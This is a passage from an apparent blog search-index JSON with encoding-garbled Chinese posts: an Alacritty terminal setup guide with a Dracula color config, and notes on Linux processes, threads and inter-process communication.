https://juejin.im/post/6844903782094995470\n\n+ https://colobu.com/2014/11/13/java-aio-introduction/\n\n+ https://www.cnblogs.com/dolphin0520/p/3916526.html\n\n  \n\n","tags":["io"],"categories":["io"]},{"title":"alacrittyæ›¿ä»£iterm2","url":"%2Fp%2F3e10f03d.html","content":"\n# 1. alacritty\n\n### 1.1 ä»‹ç»\n\niterm2 æ— ç–‘æ˜¯æ‰€æœ‰å¹³å°é‡ŒåŠŸèƒ½æœ€å¼ºçš„ç»ˆç«¯ï¼Œé—æ†¾çš„æ˜¯ç›®å‰ GPU åŠ é€Ÿå¹¶ä¸å®Œç¾ã€‚\n\nalacrittyæ˜¯ç›®å‰æ€§èƒ½æœ€å¼ºçš„ç»ˆç«¯ä¹‹ä¸€. å®ƒä½¿ç”¨GPUè¿›è¡Œæ¸²æŸ“ï¼Œå¯ä»¥åšåˆ°å…¶ä»–å¯åŠ¨å™¨æ— æ³•å®ç°çš„æ€§èƒ½ä¼˜åŒ–ã€‚\n\nå°¤å…¶ `tmux`é…åˆ`alacritty`, ä½¿ç”¨ä¸‹æ¥æ¯” iTerm2 æ›´å¿«æ›´é¡ºæ‰‹æ›´çœç”µã€‚\n\n<!-- more -->\n\n### 1.2 å®‰è£…\n\nhttps://github.com/alacritty/alacritty/releases\n\nä¸‹è½½å¯¹åº”å®‰è£…åŒ…å®‰è£…å³å¯\n\n![image-20210218231303338](alacritty%E6%9B%BF%E4%BB%A3iterm2/image-20210218231303338.png)\n\n# 2. é…ç½®\n\n### 2.1 é…ç½®æ–¹æ³•\n\nAlacritty doesn't create the config file for you, but it looks for one in the following locations:\n\n```bash\n$XDG_CONFIG_HOME/alacritty/alacritty.yml\n$XDG_CONFIG_HOME/alacritty.yml\n$HOME/.config/alacritty/alacritty.yml\n$HOME/.alacritty.yml\n```\n\n\n\nä¸‹è½½ github çš„æ¨¡æ¿\n\n```bash\nmv ~/Downloads/alacritty.yml ~/.alacritty.yml\n```\n\nä¿®æ”¹ä¿å­˜å³ç”Ÿæ•ˆ\n\n\n\n### 2.2 æˆ‘çš„é…ç½®\n\n```yml\n# ç¯å¢ƒå˜é‡\nenv:\n  TERM: alacritty\n\n# å­—ä½“\nfont:\n  normal:\n    family: MesloLGS NF\n  size: 17.0\n\n\n# é€‰ä¸­é¢æ¿è‡ªåŠ¨å¤åˆ¶\nselection:\n  save_to_clipboard: true\n  \n\n# å¸è¡€é¬¼é…è‰²\ncolors:\n  primary:\n    background: '0x282a36'\n    foreground: '0xf8f8f2'\n  cursor:\n    text: CellBackground\n    cursor: CellForeground\n  vi_mode_cursor:\n    text: CellBackground\n    cursor: CellForeground\n  search:\n    matches:\n      foreground: '0x44475a'\n      background: '0x50fa7b'\n    focused_match:\n      foreground: '0x44475a'\n      background: '0xffb86c'\n    bar:\n      background: '0x282a36'\n      foreground: '0xf8f8f2'\n  line_indicator:\n    foreground: None\n    background: None\n  selection:\n    text: CellForeground\n    background: '0x44475a'\n  normal:\n    black:   '0x000000'\n    red:     '0xff5555'\n    green:   '0x50fa7b'\n    yellow:  '0xf1fa8c'\n    blue:    '0xbd93f9'\n    magenta: '0xff79c6'\n    cyan:    '0x8be9fd'\n    white:   '0xbfbfbf'\n  bright:\n    black:   '0x4d4d4d'\n    red:     '0xff6e67'\n    green:   '0x5af78e'\n    yellow:  '0xf4f99d'\n    blue:    '0xcaa9fa'\n    magenta: '0xff92d0'\n    cyan:    '0x9aedfe'\n    white:   '0xe6e6e6'\n  dim:\n    black:   '0x14151b'\n    red:     '0xff2222'\n    green:   '0x1ef956'\n    yellow:  '0xebf85b'\n    blue:    '0x4d5b86'\n    magenta: '0xff46b0'\n    cyan:    '0x59dffc'\n    white:   '0xe6e6d1'\n```\n\n\n\n#  3. å‚è€ƒèµ„æ–™\n\n+ https://github.com/alacritty/alacritty\n\n+ https://github.com/dracula/alacritty\n\n  ","tags":["alacritty"],"categories":["ç»ˆç«¯"]},{"title":"linuxè¿›ç¨‹çº¿ç¨‹åŸè¯­","url":"%2Fp%2F21124b9a.html","content":"\n# 1. è¿›ç¨‹å’Œçº¿ç¨‹\n\n### 1.1  è¿›ç¨‹\n\næˆ‘ä»¬ç¼–å†™çš„ä»£ç åªæ˜¯ä¸€ä¸ªå­˜å‚¨åœ¨ç¡¬ç›˜çš„é™æ€æ–‡ä»¶ï¼Œé€šè¿‡ç¼–è¯‘åå°±ä¼šç”ŸæˆäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå½“æˆ‘ä»¬è¿è¡Œè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶åï¼Œå®ƒä¼šè¢«è£…è½½åˆ°å†…å­˜ä¸­ï¼Œæ¥ç€ CPU ä¼šæ‰§è¡Œç¨‹åºä¸­çš„æ¯ä¸€æ¡æŒ‡ä»¤ï¼Œé‚£ä¹ˆè¿™ä¸ªè¡Œä¸­çš„ç¨‹åºï¼Œå°±è¢«ç§°ä¸ºã€Œè¿›ç¨‹ã€ï¼ˆProcessï¼‰ã€‚\n\n##### è¿›ç¨‹çš„åŸºæœ¬çŠ¶æ€\n\nåœ¨ä¸€ä¸ªè¿›ç¨‹çš„æ´»åŠ¨æœŸé—´è‡³å°‘å…·å¤‡ä¸‰ç§åŸºæœ¬çŠ¶æ€ï¼Œå³è¿è¡ŒçŠ¶æ€ã€å°±ç»ªçŠ¶æ€ã€é˜»å¡çŠ¶æ€ã€‚\n\n- è¿è¡ŒçŠ¶æ€ï¼ˆ*Running*ï¼‰ï¼šè¯¥æ—¶åˆ»è¿›ç¨‹å ç”¨ CPUï¼›\n- å°±ç»ªçŠ¶æ€ï¼ˆ*Ready*ï¼‰ï¼šå¯è¿è¡Œï¼Œç”±äºå…¶ä»–è¿›ç¨‹å¤„äºè¿è¡ŒçŠ¶æ€è€Œæš‚æ—¶åœæ­¢è¿è¡Œï¼›\n- é˜»å¡çŠ¶æ€ï¼ˆ*Blocked*ï¼‰ï¼šè¯¥è¿›ç¨‹æ­£åœ¨ç­‰å¾…æŸä¸€äº‹ä»¶å‘ç”Ÿï¼ˆå¦‚ç­‰å¾…è¾“å…¥/è¾“å‡ºæ“ä½œçš„å®Œæˆï¼‰è€Œæš‚æ—¶åœæ­¢è¿è¡Œï¼Œè¿™æ—¶ï¼Œå³ä½¿ç»™å®ƒCPUæ§åˆ¶æƒï¼Œå®ƒä¹Ÿæ— æ³•è¿è¡Œï¼›\n\n<img src=\"linuxè¿›ç¨‹çº¿ç¨‹åŸè¯­/7-è¿›ç¨‹ä¸‰ä¸ªåŸºæœ¬çŠ¶æ€.jpg\" alt=\"è¿›ç¨‹çš„ä¸‰ç§åŸºæœ¬çŠ¶æ€\" style=\"zoom:70%;\" />\n\n<!-- more -->\n\n##### è¿›ç¨‹æ§åˆ¶å—PCB\n\nPCB æ˜¯è¿›ç¨‹å­˜åœ¨çš„å”¯ä¸€æ ‡è¯†ï¼Œè¿™æ„å‘³ç€ä¸€ä¸ªè¿›ç¨‹çš„å­˜åœ¨ï¼Œå¿…ç„¶ä¼šæœ‰ä¸€ä¸ª PCBï¼Œå¦‚æœè¿›ç¨‹æ¶ˆå¤±äº†ï¼Œé‚£ä¹ˆ PCB ä¹Ÿä¼šéšä¹‹æ¶ˆå¤±ã€‚\n\n1. è¿›ç¨‹æè¿°ä¿¡æ¯ï¼š\n\n   + è¿›ç¨‹æ ‡è¯†ç¬¦ï¼šæ ‡è¯†å„ä¸ªè¿›ç¨‹ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªå¹¶ä¸”å”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼›\n   + ç”¨æˆ·æ ‡è¯†ç¬¦ï¼šè¿›ç¨‹å½’å±çš„ç”¨æˆ·ï¼Œç”¨æˆ·æ ‡è¯†ç¬¦ä¸»è¦ä¸ºå…±äº«å’Œä¿æŠ¤æœåŠ¡ï¼›\n\n\n2. è¿›ç¨‹æ§åˆ¶å’Œç®¡ç†ä¿¡æ¯ï¼š\n\n   + è¿›ç¨‹å½“å‰çŠ¶æ€ï¼Œå¦‚ newã€readyã€runningã€waiting æˆ– blocked ç­‰ï¼›\n\n   + è¿›ç¨‹ä¼˜å…ˆçº§ï¼šè¿›ç¨‹æŠ¢å  CPU æ—¶çš„ä¼˜å…ˆçº§ï¼›\n\n\n3. èµ„æºåˆ†é…æ¸…å•ï¼š\n   + æœ‰å…³å†…å­˜åœ°å€ç©ºé—´æˆ–è™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¿¡æ¯ï¼Œæ‰€æ‰“å¼€æ–‡ä»¶çš„åˆ—è¡¨å’Œæ‰€ä½¿ç”¨çš„ I/O è®¾å¤‡ä¿¡æ¯ã€‚\n\n\n4. CPU ç›¸å…³ä¿¡æ¯ï¼š \n   + CPU ä¸­å„ä¸ªå¯„å­˜å™¨çš„å€¼ï¼Œå½“è¿›ç¨‹è¢«åˆ‡æ¢æ—¶ï¼ŒCPU çš„çŠ¶æ€ä¿¡æ¯éƒ½ä¼šè¢«ä¿å­˜åœ¨ç›¸åº”çš„ PCB ä¸­ï¼Œä»¥ä¾¿è¿›ç¨‹é‡æ–°æ‰§è¡Œæ—¶ï¼Œèƒ½ä»æ–­ç‚¹å¤„ç»§ç»­æ‰§è¡Œã€‚\n\n##### è¿›ç¨‹çš„ä¸Šä¸‹æ–‡åˆ‡æ¢\n\n> è¿›ç¨‹æ˜¯ç”±å†…æ ¸ç®¡ç†å’Œè°ƒåº¦çš„ï¼Œæ‰€ä»¥è¿›ç¨‹çš„åˆ‡æ¢åªèƒ½å‘ç”Ÿåœ¨å†…æ ¸æ€ã€‚\n\n\n\nCPU ä¸Šä¸‹æ–‡åˆ‡æ¢å°±æ˜¯å…ˆæŠŠå‰ä¸€ä¸ªä»»åŠ¡çš„ CPU ä¸Šä¸‹æ–‡ï¼ˆCPU å¯„å­˜å™¨å’Œç¨‹åºè®¡æ•°å™¨ï¼‰ä¿å­˜èµ·æ¥ï¼Œç„¶ååŠ è½½æ–°ä»»åŠ¡çš„ä¸Šä¸‹æ–‡åˆ°è¿™äº›å¯„å­˜å™¨å’Œç¨‹åºè®¡æ•°å™¨ï¼Œæœ€åå†è·³è½¬åˆ°ç¨‹åºè®¡æ•°å™¨æ‰€æŒ‡çš„æ–°ä½ç½®ï¼Œè¿è¡Œæ–°ä»»åŠ¡ã€‚\n\nä¸ºäº†æ§åˆ¶è¿›ç¨‹çš„æ‰§è¡Œï¼Œå†…æ ¸å¿…é¡»æœ‰èƒ½åŠ›æŒ‚èµ·æ­£åœ¨CPUä¸Šè¿è¡Œçš„è¿›ç¨‹ï¼Œå¹¶æ¢å¤ä»¥å‰æŒ‚èµ·çš„æŸä¸ªè¿›ç¨‹çš„æ‰§è¡Œã€‚è¿™ç§è¡Œä¸ºè¢«ç§°ä¸ºè¿›ç¨‹åˆ‡æ¢ã€‚å› æ­¤å¯ä»¥è¯´ï¼Œä»»ä½•è¿›ç¨‹éƒ½æ˜¯åœ¨æ“ä½œç³»ç»Ÿå†…æ ¸çš„æ”¯æŒä¸‹è¿è¡Œçš„ï¼Œæ˜¯ä¸å†…æ ¸ç´§å¯†ç›¸å…³çš„ã€‚ä»ä¸€ä¸ªè¿›ç¨‹çš„è¿è¡Œè½¬åˆ°å¦ä¸€ä¸ªè¿›ç¨‹ä¸Šè¿è¡Œï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­ç»è¿‡ä¸‹é¢è¿™äº›å˜åŒ–ï¼š\n\n1. ä¿å­˜å¤„ç†æœºä¸Šä¸‹æ–‡ï¼ŒåŒ…æ‹¬ç¨‹åºè®¡æ•°å™¨å’Œå…¶ä»–å¯„å­˜å™¨ã€‚\n\n2. æ›´æ–°PCBä¿¡æ¯ã€‚\n\n3. æŠŠè¿›ç¨‹çš„PCBç§»å…¥ç›¸åº”çš„é˜Ÿåˆ—ï¼Œå¦‚å°±ç»ªã€åœ¨æŸäº‹ä»¶é˜»å¡ç­‰é˜Ÿåˆ—ã€‚\n\n4. é€‰æ‹©å¦ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œï¼Œå¹¶æ›´æ–°å…¶PCBã€‚\n\n5. æ›´æ–°å†…å­˜ç®¡ç†çš„æ•°æ®ç»“æ„ã€‚\n\n6. æ¢å¤å¤„ç†æœºä¸Šä¸‹æ–‡ã€‚\n\n\n\n<img src=\"linuxè¿›ç¨‹çº¿ç¨‹åŸè¯­/13-è¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢.jpg\" alt=\"è¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢\" style=\"zoom:67%;\" />\n\n##### è§¦å‘è¿›ç¨‹åˆ‡æ¢çš„æ—¶æœº\n\n- ä¸ºäº†ä¿è¯æ‰€æœ‰è¿›ç¨‹å¯ä»¥å¾—åˆ°å…¬å¹³è°ƒåº¦ï¼ŒCPU æ—¶é—´è¢«åˆ’åˆ†ä¸ºä¸€æ®µæ®µçš„æ—¶é—´ç‰‡ï¼Œè¿™äº›æ—¶é—´ç‰‡å†è¢«è½®æµåˆ†é…ç»™å„ä¸ªè¿›ç¨‹\n- è¿›ç¨‹åœ¨ç³»ç»Ÿèµ„æºä¸è¶³ï¼ˆæ¯”å¦‚å†…å­˜ä¸è¶³ï¼‰æ—¶ï¼Œè¦ç­‰åˆ°èµ„æºæ»¡è¶³åæ‰å¯ä»¥è¿è¡Œï¼Œè¿™ä¸ªæ—¶å€™è¿›ç¨‹ä¹Ÿä¼šè¢«æŒ‚èµ·\n- å½“è¿›ç¨‹é€šè¿‡ç¡çœ å‡½æ•° sleep è¿™æ ·çš„æ–¹æ³•å°†è‡ªå·±ä¸»åŠ¨æŒ‚èµ·æ—¶\n- å½“æœ‰ä¼˜å…ˆçº§æ›´é«˜çš„è¿›ç¨‹è¿è¡Œæ—¶ï¼Œä¸ºäº†ä¿è¯é«˜ä¼˜å…ˆçº§è¿›ç¨‹çš„è¿è¡Œï¼Œå½“å‰è¿›ç¨‹ä¼šè¢«æŒ‚èµ·ï¼Œç”±é«˜ä¼˜å…ˆçº§è¿›ç¨‹æ¥è¿è¡Œ\n- å‘ç”Ÿç¡¬ä»¶ä¸­æ–­æ—¶ï¼ŒCPU ä¸Šçš„è¿›ç¨‹ä¼šè¢«ä¸­æ–­æŒ‚èµ·ï¼Œè½¬è€Œæ‰§è¡Œå†…æ ¸ä¸­çš„ä¸­æ–­æœåŠ¡ç¨‹åºï¼›\n\n##### è¿›ç¨‹é˜»å¡\n\næ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹ç”±äºä¸€äº›äº‹æƒ…å‘ç”Ÿï¼Œå¦‚è¯·æ±‚èµ„æºå¤±è´¥ã€ç­‰å¾…æŸç§æ“ä½œå®Œæˆã€æ–°æ•°æ®å°šæœªè¾¾åˆ°æˆ–è€…æ²¡æœ‰æ–°å·¥ä½œåšç­‰ï¼Œç”±ç³»ç»Ÿè‡ªåŠ¨æ‰§è¡Œé˜»å¡åŸè¯­ï¼Œä½¿è¿›ç¨‹çŠ¶æ€å˜ä¸ºé˜»å¡çŠ¶æ€ã€‚\n\nå› æ­¤ï¼Œè¿›ç¨‹é˜»å¡æ˜¯è¿›ç¨‹è‡ªèº«çš„ä¸€ç§ä¸»åŠ¨è¡Œä¸ºï¼Œåªæœ‰å¤„äºè¿è¡Œä¸­çš„è¿›ç¨‹æ‰å¯ä»¥å°†è‡ªèº«è½¬åŒ–ä¸ºé˜»å¡çŠ¶æ€ã€‚å½“è¿›ç¨‹è¢«é˜»å¡ï¼Œå®ƒæ˜¯ä¸å ç”¨CPUèµ„æºçš„ã€‚\n\n### 1.2 çº¿ç¨‹\n\nåŒä¸€ä¸ªè¿›ç¨‹å†…å¤šä¸ªçº¿ç¨‹ä¹‹é—´å¯ä»¥å…±äº«ä»£ç æ®µã€æ•°æ®æ®µã€æ‰“å¼€çš„æ–‡ä»¶ç­‰èµ„æºï¼Œä½†æ¯ä¸ªçº¿ç¨‹å„è‡ªéƒ½æœ‰ä¸€å¥—ç‹¬ç«‹çš„å¯„å­˜å™¨å’Œæ ˆï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿çº¿ç¨‹çš„æ§åˆ¶æµæ˜¯ç›¸å¯¹ç‹¬ç«‹çš„ã€‚\n\n<img src=\"linuxè¿›ç¨‹çº¿ç¨‹åŸè¯­/16-å¤šçº¿ç¨‹å†…å­˜ç»“æ„.jpg\" alt=\"å¤šçº¿ç¨‹\" style=\"zoom:57%;\" />\n\n##### çº¿ç¨‹çš„ä¼˜ç‚¹\n\n- ä¸€ä¸ªè¿›ç¨‹ä¸­å¯ä»¥åŒæ—¶å­˜åœ¨å¤šä¸ªçº¿ç¨‹ï¼›\n- å„ä¸ªçº¿ç¨‹ä¹‹é—´å¯ä»¥å¹¶å‘æ‰§è¡Œï¼›\n- å„ä¸ªçº¿ç¨‹ä¹‹é—´å¯ä»¥å…±äº«åœ°å€ç©ºé—´å’Œæ–‡ä»¶ç­‰èµ„æºï¼›\n\n##### çº¿ç¨‹çš„ç¼ºç‚¹\n\n- å½“è¿›ç¨‹ä¸­çš„ä¸€ä¸ªçº¿ç¨‹å´©æºƒæ—¶ï¼Œä¼šå¯¼è‡´å…¶æ‰€å±è¿›ç¨‹çš„æ‰€æœ‰çº¿ç¨‹å´©æºƒï¼ˆè¿™é‡Œæ˜¯é’ˆå¯¹ C/C++ è¯­è¨€ï¼ŒJavaè¯­è¨€ä¸­çš„çº¿ç¨‹å¥”æºƒä¸ä¼šé€ æˆè¿›ç¨‹å´©æºƒï¼‰\n\n##### çº¿ç¨‹çš„ä¸Šä¸‹æ–‡åˆ‡æ¢\n\nè¿™è¿˜å¾—çœ‹çº¿ç¨‹æ˜¯ä¸æ˜¯å±äºåŒä¸€ä¸ªè¿›ç¨‹ï¼š\n\n+ å½“ä¸¤ä¸ªçº¿ç¨‹ä¸æ˜¯å±äºåŒä¸€ä¸ªè¿›ç¨‹ï¼Œåˆ™åˆ‡æ¢çš„è¿‡ç¨‹å°±è·Ÿè¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢ä¸€æ ·ï¼›\n\n+ å½“ä¸¤ä¸ªçº¿ç¨‹æ˜¯å±äºåŒä¸€ä¸ªè¿›ç¨‹ï¼Œå› ä¸ºè™šæ‹Ÿå†…å­˜æ˜¯å…±äº«çš„ï¼Œæ‰€ä»¥åœ¨åˆ‡æ¢æ—¶ï¼Œè™šæ‹Ÿå†…å­˜è¿™äº›èµ„æºå°±ä¿æŒä¸åŠ¨ï¼Œåªéœ€è¦åˆ‡æ¢çº¿ç¨‹çš„ç§æœ‰æ•°æ®ã€å¯„å­˜å™¨ç­‰ä¸å…±äº«çš„æ•°æ®ï¼›\n\næ‰€ä»¥ï¼Œçº¿ç¨‹çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ç›¸æ¯”è¿›ç¨‹ï¼Œå¼€é”€è¦å°å¾ˆå¤šã€‚\n\n### 1.3 çº¿ç¨‹è¿›ç¨‹åŒºåˆ«\n\n> è¿›ç¨‹æ˜¯èµ„æºåˆ†é…çš„æœ€å°å•ä½ï¼Œçº¿ç¨‹æ˜¯CPUè°ƒåº¦çš„æœ€å°å•ä½ï¼›\n\n\n\n- è¿›ç¨‹æ˜¯èµ„æºï¼ˆåŒ…æ‹¬å†…å­˜ã€æ‰“å¼€çš„æ–‡ä»¶ç­‰ï¼‰åˆ†é…çš„å•ä½ï¼Œçº¿ç¨‹æ˜¯ CPU è°ƒåº¦çš„å•ä½ï¼›\n- è¿›ç¨‹æ‹¥æœ‰ä¸€ä¸ªå®Œæ•´çš„èµ„æºå¹³å°ï¼Œè€Œçº¿ç¨‹åªç‹¬äº«å¿…ä¸å¯å°‘çš„èµ„æºï¼Œå¦‚å¯„å­˜å™¨å’Œæ ˆï¼›\n- çº¿ç¨‹åŒæ ·å…·æœ‰å°±ç»ªã€é˜»å¡ã€æ‰§è¡Œä¸‰ç§åŸºæœ¬çŠ¶æ€ï¼ŒåŒæ ·å…·æœ‰çŠ¶æ€ä¹‹é—´çš„è½¬æ¢å…³ç³»ï¼›\n- çº¿ç¨‹èƒ½å‡å°‘å¹¶å‘æ‰§è¡Œçš„æ—¶é—´å’Œç©ºé—´å¼€é”€ï¼›\n\n\n\n# 2. è¿›ç¨‹é—´é€šä¿¡\n\n<img src=\"linuxè¿›ç¨‹çº¿ç¨‹åŸè¯­/4-è¿›ç¨‹ç©ºé—´.jpg\" alt=\"img\" style=\"zoom:50%;\" />\n\næ¯ä¸ªè¿›ç¨‹çš„ç”¨æˆ·åœ°å€ç©ºé—´éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œä¸€èˆ¬è€Œè¨€æ˜¯ä¸èƒ½äº’ç›¸è®¿é—®çš„ï¼Œä½†å†…æ ¸ç©ºé—´æ˜¯æ¯ä¸ªè¿›ç¨‹éƒ½å…±äº«çš„ï¼Œæ‰€ä»¥è¿›ç¨‹ä¹‹é—´è¦é€šä¿¡å¿…é¡»é€šè¿‡å†…æ ¸ã€‚\n\nè¿›ç¨‹é—´é€šä¿¡ä¸»è¦åŒ…æ‹¬ç®¡é“ã€ç³»ç»ŸIPCï¼ˆåŒ…æ‹¬æ¶ˆæ¯é˜Ÿåˆ—ã€ä¿¡å·é‡ã€ä¿¡å·ã€å…±äº«å†…å­˜ç­‰ï¼‰ã€ä»¥åŠå¥—æ¥å­—socketã€‚\n\n### 2.1 ç®¡é“\n\n```c\nint pipe(int fd[2])\n```\n\n\n\nè¿™é‡Œè¡¨ç¤ºåˆ›å»ºä¸€ä¸ªåŒ¿åç®¡é“ï¼Œå¹¶è¿”å›äº†ä¸¤ä¸ªæè¿°ç¬¦ï¼Œä¸€ä¸ªæ˜¯ç®¡é“çš„è¯»å–ç«¯æè¿°ç¬¦ `fd[0]`ï¼Œå¦ä¸€ä¸ªæ˜¯ç®¡é“çš„å†™å…¥ç«¯æè¿°ç¬¦ `fd[1]`ã€‚æ³¨æ„ï¼Œè¿™ä¸ªåŒ¿åç®¡é“æ˜¯ç‰¹æ®Šçš„æ–‡ä»¶ï¼Œåªå­˜åœ¨äºå†…å­˜ï¼Œä¸å­˜äºæ–‡ä»¶ç³»ç»Ÿä¸­ã€‚\n\n<img src=\"linuxè¿›ç¨‹çº¿ç¨‹åŸè¯­/5-ç®¡é“-pipe.jpg\" alt=\"img\" style=\"zoom:50%;\" />\n\nè¿™ä¸¤ä¸ªæè¿°ç¬¦éƒ½æ˜¯åœ¨ä¸€ä¸ªè¿›ç¨‹é‡Œé¢ï¼Œå¹¶æ²¡æœ‰èµ·åˆ°è¿›ç¨‹é—´é€šä¿¡çš„ä½œç”¨ï¼Œæ€ä¹ˆæ ·æ‰èƒ½ä½¿å¾—ç®¡é“æ˜¯è·¨è¿‡ä¸¤ä¸ªè¿›ç¨‹çš„å‘¢ï¼Ÿ\n\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ `fork` åˆ›å»ºå­è¿›ç¨‹ï¼Œ**åˆ›å»ºçš„å­è¿›ç¨‹ä¼šå¤åˆ¶çˆ¶è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦**ï¼Œè¿™æ ·å°±åšåˆ°äº†ä¸¤ä¸ªè¿›ç¨‹å„æœ‰ä¸¤ä¸ªã€Œ `fd[0]` ä¸ `fd[1]`ã€ï¼Œä¸¤ä¸ªè¿›ç¨‹å°±å¯ä»¥é€šè¿‡å„è‡ªçš„ fd å†™å…¥å’Œè¯»å–åŒä¸€ä¸ªç®¡é“æ–‡ä»¶å®ç°è·¨è¿›ç¨‹é€šä¿¡äº†ã€‚\n\n<img src=\"linuxè¿›ç¨‹çº¿ç¨‹åŸè¯­/6-ç®¡é“-pipe-fork.jpg\" alt=\"img\" style=\"zoom:50%;\" />\n\n- çˆ¶è¿›ç¨‹å…³é—­è¯»å–çš„ fd[0]ï¼Œåªä¿ç•™å†™å…¥çš„ fd[1]ï¼›\n- å­è¿›ç¨‹å…³é—­å†™å…¥çš„ fd[1]ï¼Œåªä¿ç•™è¯»å–çš„ fd[0]ï¼›\n\n\n\n<img src=\"linuxè¿›ç¨‹çº¿ç¨‹åŸè¯­/7-ç®¡é“-pipe-fork-å•å‘é€šä¿¡.jpg\" alt=\"img\" style=\"zoom:50%;\" />\n\næ‰€ä»¥è¯´å¦‚æœéœ€è¦åŒå‘é€šä¿¡ï¼Œåˆ™åº”è¯¥åˆ›å»ºä¸¤ä¸ªç®¡é“ã€‚\n\n\n\nåœ¨ shell é‡Œé¢æ‰§è¡Œ `A | B`å‘½ä»¤çš„æ—¶å€™ï¼ŒA è¿›ç¨‹å’Œ B è¿›ç¨‹éƒ½æ˜¯ shell åˆ›å»ºå‡ºæ¥çš„å­è¿›ç¨‹ï¼ŒA å’Œ B ä¹‹é—´ä¸å­˜åœ¨çˆ¶å­å…³ç³»ï¼Œå®ƒä¿©çš„çˆ¶è¿›ç¨‹éƒ½æ˜¯ shellã€‚\n\n<img src=\"linuxè¿›ç¨‹çº¿ç¨‹åŸè¯­/8-ç®¡é“-pipe-shell.jpg\" alt=\"img\" style=\"zoom:40%;\" />\n\n\n\nä¸ç®¡æ˜¯åŒ¿åç®¡é“è¿˜æ˜¯å‘½åç®¡é“ï¼Œè¿›ç¨‹å†™å…¥çš„æ•°æ®éƒ½æ˜¯ç¼“å­˜åœ¨å†…æ ¸ä¸­ï¼Œå¦ä¸€ä¸ªè¿›ç¨‹è¯»å–æ•°æ®æ—¶å€™è‡ªç„¶ä¹Ÿæ˜¯ä»å†…æ ¸ä¸­è·å–ã€‚\n\n### 2.2  æ¶ˆæ¯é˜Ÿåˆ—\n\nA è¿›ç¨‹è¦ç»™ B è¿›ç¨‹å‘é€æ¶ˆæ¯ï¼ŒA è¿›ç¨‹æŠŠæ•°æ®æ”¾åœ¨å¯¹åº”çš„æ¶ˆæ¯é˜Ÿåˆ—åå°±å¯ä»¥æ­£å¸¸è¿”å›äº†ï¼ŒB è¿›ç¨‹éœ€è¦çš„æ—¶å€™å†å»è¯»å–æ•°æ®å°±å¯ä»¥äº†ã€‚åŒç†ï¼ŒB è¿›ç¨‹è¦ç»™ A è¿›ç¨‹å‘é€æ¶ˆæ¯ä¹Ÿæ˜¯å¦‚æ­¤ã€‚\n\næ¶ˆæ¯é˜Ÿåˆ—æ˜¯ä¿å­˜åœ¨å†…æ ¸ä¸­çš„æ¶ˆæ¯é“¾è¡¨ã€‚æ¶ˆæ¯é˜Ÿåˆ—ä¸é€‚åˆæ¯”è¾ƒå¤§æ•°æ®çš„ä¼ è¾“ï¼Œå› ä¸ºåœ¨å†…æ ¸ä¸­æ¯ä¸ªæ¶ˆæ¯ä½“éƒ½æœ‰ä¸€ä¸ªæœ€å¤§é•¿åº¦çš„é™åˆ¶ï¼ŒåŒæ—¶æ‰€æœ‰é˜Ÿåˆ—æ‰€åŒ…å«çš„å…¨éƒ¨æ¶ˆæ¯ä½“çš„æ€»é•¿åº¦ä¹Ÿæ˜¯æœ‰ä¸Šé™ã€‚\n\næ¶ˆæ¯é˜Ÿåˆ—é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œå­˜åœ¨ç”¨æˆ·æ€ä¸å†…æ ¸æ€ä¹‹é—´çš„æ•°æ®æ‹·è´å¼€é”€ï¼Œå› ä¸ºè¿›ç¨‹å†™å…¥æ•°æ®åˆ°å†…æ ¸ä¸­çš„æ¶ˆæ¯é˜Ÿåˆ—æ—¶ï¼Œä¼šå‘ç”Ÿä»ç”¨æˆ·æ€æ‹·è´æ•°æ®åˆ°å†…æ ¸æ€çš„è¿‡ç¨‹ï¼ŒåŒç†å¦ä¸€è¿›ç¨‹è¯»å–å†…æ ¸ä¸­çš„æ¶ˆæ¯æ•°æ®æ—¶ï¼Œä¼šå‘ç”Ÿä»å†…æ ¸æ€æ‹·è´æ•°æ®åˆ°ç”¨æˆ·æ€çš„è¿‡ç¨‹ã€‚\n\n### 2.3 å…±äº«å†…å­˜\n\nå…±äº«å†…å­˜çš„æœºåˆ¶ï¼Œå°±æ˜¯æ‹¿å‡ºä¸€å—è™šæ‹Ÿåœ°å€ç©ºé—´æ¥ï¼Œæ˜ å°„åˆ°ç›¸åŒçš„ç‰©ç†å†…å­˜ä¸­ã€‚è¿™æ ·è¿™ä¸ªè¿›ç¨‹å†™å…¥çš„ä¸œè¥¿ï¼Œå¦å¤–ä¸€ä¸ªè¿›ç¨‹é©¬ä¸Šå°±èƒ½çœ‹åˆ°äº†ï¼Œéƒ½ä¸éœ€è¦æ‹·è´æ¥æ‹·è´å»ï¼Œä¼ æ¥ä¼ å»ï¼Œå¤§å¤§æé«˜äº†è¿›ç¨‹é—´é€šä¿¡çš„é€Ÿåº¦ã€‚\n\n<img src=\"linuxè¿›ç¨‹çº¿ç¨‹åŸè¯­/9-å…±äº«å†…å­˜.jpg\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\n### 2.4 ä¿¡å·é‡\n\nä¿¡å·é‡å…¶å®æ˜¯ä¸€ä¸ªæ•´å‹çš„è®¡æ•°å™¨ï¼Œä¸»è¦ç”¨äºå®ç°è¿›ç¨‹é—´çš„äº’æ–¥ä¸åŒæ­¥ï¼Œè€Œä¸æ˜¯ç”¨äºç¼“å­˜è¿›ç¨‹é—´é€šä¿¡çš„æ•°æ®ã€‚ä¿¡å·åˆå§‹åŒ–ä¸º 